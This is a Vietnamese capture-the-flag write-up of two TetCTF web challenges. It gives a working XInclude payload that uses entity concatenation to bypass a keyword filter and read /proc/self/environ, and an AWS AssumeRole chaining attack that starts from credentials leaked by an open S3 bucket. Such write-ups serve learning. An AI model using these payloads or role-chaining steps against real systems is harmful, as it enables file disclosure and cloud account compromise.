# 2X-Service

![2x-service](https://user-images.githubusercontent.com/82533607/147850702-16a63ccc-ba1d-4543-81ac-4aa052659960.png)

> Well, đây là bài duy nhất mà tôi giải được trong 2 ngày TetCTF, vẫn còn non quá mà :(((

## Source code & analysis

### Source code:

Đây là source code của `app.py`:

```python
import random
import os
from flask import Flask, render_template, render_template_string, url_for, redirect, request
from flask_socketio import SocketIO, emit, send
from xml.etree import ElementTree, ElementInclude

app = Flask(__name__)

app.config['SECRET_KEY'] = 'XXXXXXXSECREKTXXXXXXXX'
socketio = SocketIO(app)

@app.route('/')
def index():
	return redirect(url_for('dashboard'))


@app.route('/dashboard')
def dashboard():
	return render_template('./dashboard.html')

@app.route('/source')
def source():
	return render_template('source.html')

@app.route('/about')
def about():
	return render_template('about.html')


@socketio.on('message')
def handle_message(xpath, xml):
	if len(xpath) != 0 and len(xml) != 0 and "text" not in xml.lower():
		try:
			res = ''
			root = ElementTree.fromstring(xml.strip())
			ElementInclude.include(root)
			for elem in root.findall(xpath):
				if elem.text != "":
					res += elem.text + ", "
			emit('result', res[:-2])
		except Exception as e:
			emit('result', 'Nani?')
	else:
		emit('result', 'Nani?')


@socketio.on('my event')
def handle_my_custom_event(json):
	print('received json: ' + str(json))

if __name__ == '__main__':
	socketio.run(app, host='0.0.0.0', port=8003)
```

### Analysis

Ở bài này sử dụng websocket thông qua `flask-socketio`, nhìn qua source code của `/dardboard` ta thấy có `jquery` và `socketio` được import sẵn, nhưng chưa khởi tạo `socket`:

```html
<link rel="stylesheet" href="static/css/tsu.css">
<script src="static/js/jquery.min.js"></script>
<script src="static/js/socket.io.js"></script>
<script src="static/js/tsu.js"></script>


<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>

  <div class="header">
    <a href="#default" class="logo">2X-Service</a>
    <div class="header-right">
      <a class="active" href="/">Home</a>
      <a href="/source">Source</a>
      <a href="/about">About</a>
    </div>
  </div>

<body>

<br><br>
<center>
	<div class="form" >
	    <label>XPATH</label><br>
	    <input type="text" id="xpath" placeholder="Ex: attribute"><br>

	    <label>XML</label>
	    <textarea type="text" id="xml" rows="25" placeholder="Ex:&#10;<person>&#10;<name>tsu</name>&#10;<attribute>deptrai</attribute>&#10;</person>" ></textarea>
	  
	    <input type="submit" id="process" value="Process">
	</div>
</center>
```

Vì vậy, để gửi được request từ client đến socket tại server, ta cần thiết lập socket, sau khi đọc qua doc của `flask-socket`, mình đã tạo ra đoạn code `jquery` như sau:

```js
// Define the socket
socket = io()
// Connect to server's socket
socket.connect('http://207.148.119.136:8003')
// Test connection:
socket.on('connect', function() {
    socket.send('hello?', 'hi')
    console.log(socket.connected)
})
// Listen to response, then log to console
socket.on('result', function (data) {
    console.log(data);
});
// Submit form's content to server's socket
$('.form').submit(function(){
    socket.send($('#xpath').val(), $('#xml').val())
})
```

Test thử xem sao:

![socket_connected](https://user-images.githubusercontent.com/82533607/147850835-c6220de1-ba84-482b-b38f-da04f3c15ecc.png)

Vậy là đã xong phần socket, bây giờ cần phân tích source code một chút, cụ thể là phần `message`:

```python
@socketio.on('message')
def handle_message(xpath, xml):
	if len(xpath) != 0 and len(xml) != 0 and "text" not in xml.lower():
		try:
			res = ''
			root = ElementTree.fromstring(xml.strip())
			ElementInclude.include(root)
			for elem in root.findall(xpath):
				if elem.text != "":
					res += elem.text + ", "
			emit('result', res[:-2])
		except Exception as e:
			emit('result', 'Nani?')
	else:
		emit('result', 'Nani?')
```

## Exploit

Đọc qua thì sẽ thấy phần này khá giống bài [X-Service](https://dauhoangtai.github.io/ctf/2021/11/13/WRITEUP-SVATTT-FINAL-2021-WEB.html#challenge-x-service) của vòng chung kết SVATTT 2021.

Ta có thể sử dụng payload sau:

```xml
<?xml version='1.0'?>
<document xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="path_of_the_file" parse="text"/>
</document>
```

Nhưng có một vấn đề là, `text` bị filter, sau khi đọc qua doc của [xi:include](https://www.w3.org/TR/xinclude-11) thì mình nhận ra rằng, chẳng có `parser` nào có thể giải quyết vấn đề này, vì vậy, chỉ còn cách làm thế nào để `text` xuất hiện mà không bị filter.

Thực ra mọi chuyện khá đơn giản, chúng ta có thể dùng phương pháp `concat` như sau:

- Đầu tiên, define 2 biến `te` và `xt` thông qua `ENTITY`

```xml
<?xml version='1.0'?>
<!DOCTYPE resources [
  <!ENTITY te "te">
  <!ENTITY xt "xt">
]>
```

- Tiếp theo, sử dụng 2 biến đó:

```xml
<document xmlns:xi="http://www.w3.org/2001/XInclude">
<p>
  <xi:include href="flag.txt" parse="&te;&xt;"/>
</p>
</document>
```

> &te;&xt; <=> "te" + "xt" = "text"

Và ta có payload hoàn chỉnh:

```xml
<?xml version='1.0'?>
<!DOCTYPE resources [
  <!ENTITY te "te">
  <!ENTITY xt "xt">
]>

<document xmlns:xi="http://www.w3.org/2001/XInclude">
<p>
  <xi:include href="flag.txt" parse="&te;&xt;"/>
</p>
</document>
```

Sử dụng `xpath = *`, đầu tiên, thử trên local xem sao?

![test](https://user-images.githubusercontent.com/82533607/147851083-50c4ca78-6545-44eb-a839-51b320ac056b.png)

OK, vậy là payload hoạt động tốt, vậy thử trên server xem sao?

![test_server](https://user-images.githubusercontent.com/82533607/147851133-1ca3f3c1-3383-49ff-9735-fa62e78fe437.png)

Oh, vậy là file `flag.txt` có thể không tồn tại, vậy là nó nằm ở đâu?

Sau một hồi "fuzzing bằng cơm" thì tôi vô tình tìm thấy được flag tại `/proc/self/environ`:

```xml
<?xml version='1.0'?>
<!DOCTYPE resources [
  <!ENTITY te "te">
  <!ENTITY xt "xt">
]>

<document xmlns:xi="http://www.w3.org/2001/XInclude">
<p>
  <xi:include href="/proc/self/environ" parse="&te;&xt;"/>
</p>
</document>
```

![flag](https://user-images.githubusercontent.com/82533607/147851230-9c48d2de-6d3e-44f0-a123-6e741fcbc1bd.png)

Flag: `FLAG=TetCTF{Just_Warm_y0u_uP_:P__}`

> Từ sáng đến tối chỉ để giải được 1 bài web duy nhất 😞

# Picked onion

![chall](https://user-images.githubusercontent.com/82533607/147910715-ae6e2f99-a294-4397-88bb-878d50561751.png)

## Reconaisance

Truy cập vào URL, ta thấy có một mục có tên là `Secret`, thử truy cập và thấy một bức ảnh. Ctrl U (view-source) thì thấy bức ảnh `href` là một `s3 bucket` có tên là `secret-tetctf`:


![secret_img](https://user-images.githubusercontent.com/82533607/147911410-fa0489b2-e116-4a55-8f8c-3ebfe9588b4f.png)

Điều đáng chú ý ở đây, là khi sửa URL thành `https://secret-tetctf.s3.amazonaws.com/` thì ta thấy:


![first_leak](https://user-images.githubusercontent.com/82533607/147911956-a3d47c09-f901-4263-8f59-76a4fab0140e.png)

Có thể chia làm 3 đoạn như sau:

```
secret-tetctf1000false
I've_Got_a_Secret.jpg2021-12-31T07:12:14.000Z"8176cb55798ee6c7df58496312ca82d8"12949STANDARD
secret2021-12-31T07:15:50.000Z"1ace2f1a8925799880ad32ef47b3e9d9"1239STANDARD
```

Đây là một lỗi Access Control của S3 Bucket, tại đây, ta có thể thấy còn một file `secret` nữa, mình sẽ tải nó về bằng URL: `https://secret-tetctf.s3.amazonaws.com/secret` và đọc nó:


![secret_file](https://user-images.githubusercontent.com/82533607/147912573-6842e886-3c0d-4e54-a0bf-2e909c343f7e.png)

Ta thu được `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` và `REGION_NAME` của IAM User được sử dụng cho `dynamodb`.

## Exploit

Ban đầu khi đọc qua source code thì mình thấy nó giống hoàn toàn với [bài viết này](https://ctrsec.io/index.php/2021/12/19/python-deserialization-on-integrated-aws-ddb-flask-app/) của anh Chi Tran, nhưng tất nhiên, nếu vậy thì đơn giản quá:

![fail_1](https://user-images.githubusercontent.com/82533607/147912969-f153ba6d-61a9-491f-8b65-1ee78a979c63.png)

Có thể thấy, vấn đề ở đây là IAM User ddb_user mà ta đang sử dụng không có quyền hạn gì mấy để thực hiện exploit như bài viết ở trên.

Sau một hồi lục lọi trên doc của AWS thì mình thấy điều này:

```console
$ aws iam list-roles
{
    "Roles": [
        ...
        {
            "Path": "/",
            "RoleName": "CTF_ROLE",
            "RoleId": "AROAXNIS54O****************",
            "Arn": "arn:aws:iam::************:role/CTF_ROLE",
            "CreateDate": "2021-12-29T15:30:56Z",
            "AssumeRolePolicyDocument": {
                "Version": "2008-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "*"
                        },
                        "Action": "sts:AssumeRole",
                        "Condition": {
                            "StringLike": {
                                "aws:PrincipalArn": "arn:aws:iam::*:role/*-Accessing_Tet_CTF_Flag*"
                            }
                        }
                    }
                ]
            },
            "Description": "CTF_ROLE",
            "MaxSessionDuration": 3600
        }
    ]
}

```

Cùng hiểu một chút về đoạn JSON ở trên nhé?

Đây là một policy cho việc AssumeRole, ta thu được khá nhiều thông tin, đặc biệt nhất là Condittion cho việc AssumeRole, đó là chuỗi PrincipalArn trong request phải chứa một chuỗi `<anything>-Accessing_Tet_CTF_Flag<anything>`, cụ thể hơn thì chính xác cái user gửi request AssumeRole phải mang một IAM Role có tên với định dạng kể trên, như vậy, để thực hiện exploit, ta cần:

- Tạo một IAM User.

- Tạo một IAM Role có tên dưới dạng `<anything>-Accessing_Tet_CTF_Flag<anything>` mà IAM User vừa tạo có thể AssumeRole được.

- AssumeRole `<anything>-Accessing_Tet_CTF_Flag<anything>` vào IAM User đã tạo và lưu các creditials được trả về.

- AssumeRole `CTF_ROLE` ở trên và IAM User đã tạo, lưu lại creditials được trả về.

Giải thích lại một chút về ARN trong AWS, ARN là một chuỗi có dạng: `arn:partition:service:region:account:resource`, khi IAM User gửi bất kì request nào có yêu cầu credential, các chuỗi ARN sẽ được gửi đi, và chúng ta có thể sử dụng các chuỗi ARN này để viết policy phân quyền theo IAM Role cho các IAM User với điều kiện cụ thể.

Quay lại với vấn đề chính, vì không có AWS account để tạo IAM User nên mình đã inbox mượn anh Chi Tran một IAM User.

Sử dụng `aws configure` và điền các thông tin vào:

```console
$ aws configure
AWS Access Key ID [********************]: AKIAXNIS************
AWS Secret Access Key [********************]: VmK2ZWUVZ************************
Default region name [us-east-1]: 
Default output format [json]: 
```

Sau đó, tạo một file `Trust-policy.json`, sử dụng làm Policy cho Role mới (đừng làm theo ở thực tế, vì lý do bảo mật):

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "*" // allow all, no condittion
      },
      "Action": "sts:AssumeRole",
      "Condition": {}
    }
  ]
}
```

Và sử dụng `aws iam create-role --role-name <anything>-Accessing_Tet_CTF_Flag<anything> --assume-role-policy-document file://Trust-policy.json` để tạo Role, nhớ note lại ARN ở output

AssumeRole:

```console
$ aws sts assume-role --role-arn "arn:aws:iam::***************:role/<anything>-Accessing_Tet_CTF_Flag<anything>" --role-session-name <anyname>
{
    "Credentials": {
        "AccessKeyId": "access_key_id_here",
        "SecretAccessKey": "secret_access_key_here",
        "SessionToken": "long_token_here",
        "Expiration": "2022-01-03T09:02:51Z"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "******************:<anyname>",
        "Arn": "arn:aws:sts::***************:assumed-role/<anything>-Accessing_Tet_CTF_Flag<anything>/<anyname>"
    }
}
```

Lưu credential vào Env:

```console
$ export AWS_ACCESS_KEY_ID=<"AccessKeyId">
$ export AWS_SECRET_ACCESS_KEY=<"SecretAccessKey">
$ export AWS_SESSION_TOKEN=<"SessionToken">
```

Tiến hành AssumeRole `CTF_ROLE`:

```console
$ aws sts assume-role --role-arn "arn:aws:iam::***************:role/CTF_ROLE" --role-session-name <anyname>
{
    "Credentials": {
        "AccessKeyId": "access_key_id_here",
        "SecretAccessKey": "secret_access_key_here",
        "SessionToken": "long_token_here",
        "Expiration": "2022-01-03T09:02:51Z"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "******************:<anyname>",
        "Arn": "arn:aws:sts::***************:assumed-role/CTF_ROLE/<anyname>"
    }
}
```

Và lại lưu credentials:

```console
$ export AWS_ACCESS_KEY_ID=<"AccessKeyId">
$ export AWS_SECRET_ACCESS_KEY=<"SecretAccessKey">
$ export AWS_SESSION_TOKEN=<"SessionToken">
```

Lúc này, ta đã có Role CTF_ROLE, nếu chưa chắc chắn, có thể kiểm tra bằng `aws sts get-caller-identity`, nếu thấy CTF_ROLE thì đã thành công.

Tiến hành list các bucket:

```console
$ aws s3api list-buckets --query "Buckets[].Name"
[
    "secret-tetctf",
    "tet-ctf-secret"
]
```

Vậy là ta thấy thêm một bucket nữa tên là `tet-ctf-secret`, kiểm tra xem trên đó có gì:

```console
$ aws s3 ls s3://tet-ctf-secret
2021-12-29 22:18:42         29 flag
```

Có file flag, thử lấy nó về và đọc:

```console
$ aws s3 cp s3://tet-ctf-secret/flag flag
download: s3://tet-ctf-secret/flag to ./flag 

$ cat flag
TetCTF{AssumE_R0le-iS-A-MuSt}
```

Done, flag: `TetCTF{AssumE_R0le-iS-A-MuSt}`

> Cảm ơn anh Chi Tran, đồng thời là người ra đề của chall này, đã cho em mượn IAM User và chỉ dẫn em trong quá trình giải, cũng như là học thêm kiến thức mới!
